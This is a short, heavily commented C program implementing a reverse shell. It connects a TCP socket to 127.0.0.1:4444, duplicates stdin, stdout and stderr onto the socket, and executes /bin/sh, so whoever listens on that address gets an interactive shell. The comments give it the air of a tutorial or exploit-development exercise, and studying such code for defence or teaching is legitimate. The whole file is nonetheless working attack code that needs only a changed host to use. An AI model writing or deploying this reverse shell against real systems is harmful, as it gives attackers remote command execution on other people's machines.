#include <unistd.h> // dup2, execve
#include <netinet/in.h> // socket structures and constants
#include <arpa/inet.h> // inet_addr

#define RHOST "127.0.0.1"
#define RPORT 4444

int main() {
  int sockfd;
  struct sockaddr_in remote_addr;


  // CREATE SOCKET
  // create a new socket  (ipv4, tcp, tcp)
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


  // CONNECT TO ADDRESS
  // create the address to connect to
  remote_addr.sin_family = AF_INET; // ipv4
  remote_addr.sin_port = htons(RPORT); // port in the correct endianness
  remote_addr.sin_addr.s_addr = inet_addr(RHOST);

  // Connect to the specified address (127.0.0.1:4444)
  connect(sockfd, (struct sockaddr*) &remote_addr, sizeof(remote_addr));


  // CHANGE STD FILE DESCRIPTORS
  // Overwrite old stdin, stdout, stderr fd's with the socket fd
  dup2(sockfd, 0); // stdin
  dup2(sockfd, 1); // stdout
  dup2(sockfd, 2); // stderr


  // EXECVE SHELL
  // Execute the new program /bin/sh, which will now use the socket to
  //  handle it's stdin, stdout, and stderr
  execve("/bin/sh", NULL, NULL);


  // EXIT
  // This will never happen because execve closes out for us.
  return 0;
}
